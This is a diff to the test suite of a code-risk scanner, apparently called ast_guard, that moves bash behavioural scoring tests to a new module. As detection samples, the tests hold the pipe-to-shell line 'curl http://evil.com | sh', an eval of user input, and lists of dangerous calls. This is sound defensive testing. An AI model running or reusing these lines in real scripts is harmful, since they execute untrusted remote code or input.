@@ -529,27 +529,47 @@ class TestNormalCode:
 # ===========================================================================
 
 class TestNonPython:
-    def test_bash_dangerous_call(self):
-        result = risk_score_standalone(
-            "curl http://evil.com | sh",
-            ast.parse(""),
-            {"dangerous_calls": ["curl", "sh"]},
-            "bash",
-        )
-        assert result["score"] == 100  # 2 × 50
-        assert result["severity"] == "CRITICAL"
+    # Bash behavioral scoring is now handled by lang_bash_behavioral.score(),
+    # not by risk_score_standalone. These tests cover the new module.
 
-    def test_bash_single_dangerous_call_warning(self):
-        result = risk_score_standalone(
-            "curl http://example.com",
-            ast.parse(""),
-            {"dangerous_calls": ["curl"]},
-            "bash",
+    def test_bash_pipe_to_shell_critical(self):
+        from ast_guard.lang_bash_behavioral import score
+        result = score(
+            "curl http://evil.com | sh",
+            {"dangerous_calls": ["curl"], "call_list": ["curl", "sh"]},
         )
-        assert result["score"] == 50
-        assert result["severity"] == "WARNING"
+        assert result["severity"] == "CRITICAL"
+        patterns = {f["pattern"] for f in result["findings"]}
+        assert "pipe_to_shell" in patterns
+
+    def test_bash_eval_critical(self):
+        from ast_guard.lang_bash_behavioral import score
+        result = score(
+            'eval "$user_input"',
+            {"dangerous_calls": ["eval"], "call_list": ["eval"]},
+        )
+        assert result["severity"] == "CRITICAL"
+        assert any(f["pattern"] == "eval_dynamic" for f in result["findings"])
+
+    def test_bash_network_fetch_only_clean(self):
+        # curl alone scores +20 — below WARNING threshold.
+        from ast_guard.lang_bash_behavioral import score
+        result = score(
+            "curl https://example.com/file.txt -o file.txt",
+            {"dangerous_calls": ["curl"], "call_list": ["curl"]},
+        )
+        assert result["score"] == 20
+        assert result["severity"] == "CLEAN"
 
     def test_bash_no_dangerous_calls_clean(self):
+        from ast_guard.lang_bash_behavioral import score
+        result = score("echo hello\nmkdir /tmp/work\n", {"dangerous_calls": [], "call_list": ["echo", "mkdir"]})
+        assert result["severity"] == "CLEAN"
+        assert result["score"] == 0
+
+    def test_risk_score_standalone_bash_language_clean(self):
+        # risk_score_standalone is now Python-only; calling it with bash
+        # and an empty tree should return CLEAN without errors.
         result = risk_score_standalone(
             "echo hello",
             ast.parse(""),
